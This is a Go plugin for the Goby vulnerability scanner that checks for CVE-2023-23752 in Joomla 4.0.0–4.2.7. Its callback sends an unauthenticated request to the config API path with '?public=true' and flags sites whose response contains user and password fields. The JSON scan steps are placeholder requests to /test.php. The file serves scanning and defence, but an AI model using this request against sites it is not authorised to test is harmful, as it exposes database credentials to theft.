package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
  "Name": "Joomla_unauthorized_CVE-2023-23752",
  "Description": "<p><span style=\"font-size: 15px;\">在 Joomla! 版本为4.0.0 到 4.2.7中发现了一个漏洞，在Joomla受影响的版本中由于对Web服务端点的访问限制不当，远程攻击者可以绕过安全限制获得Web应用程序敏感信息。</span><br></p>",
  "Product": "Joomla",
  "Homepage": "http://www.Joomla.org/",
  "DisclosureDate": "2023-02-13",
  "Author": "luckying",
  "FofaQuery": "app=\"Joomla\"",
  "GobyQuery": "app=\"Joomla\"",
  "Level": "2",
  "Impact": "<p><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统。CVE-2023-23752 中，由于鉴权存在错误，导致攻击者可构造恶意请求未授权访问RestAPI 接口，造成敏感信息泄漏，获取Joomla相关配置信息。</span><br></p>",
  "Recommendation": "<p><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">建议您更新当前系统或软件至最新版，完成漏洞的修复。</span><br></p>",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    ""
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Joomla_unauthorized_CVE-2023-23752",
      "Product": "Joomla",
      "Description": "<p><span style=\"font-size: 15px;\">在 Joomla! 版本为4.0.0 到 4.2.7中发现了一个漏洞，在Joomla受影响的版本中由于对Web服务端点的访问限制不当，远程攻击者可以绕过安全限制获得Web应用程序敏感信息。</span><br></p>",
      "Recommendation": "<p><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">建议您更新当前系统或软件至最新版，完成漏洞的修复。</span><br></p>",
      "Impact": "<p><span style=\"color: rgb(52, 58, 64); font-size: 16px;\">Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统。CVE-2023-23752 中，由于鉴权存在错误，导致攻击者可构造恶意请求未授权访问RestAPI 接口，造成敏感信息泄漏，获取Joomla相关配置信息。</span><br></p>",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "Joomla_unauthorized_CVE-2023-23752",
      "Product": "Joomla",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/api/index.php/v1/config/application?public=true"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.Header.Store("Accept", "*/*")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "user") && (strings.Contains(resp.RawBody, "password"))
			}
			return false
		},
		nil,
	))
}
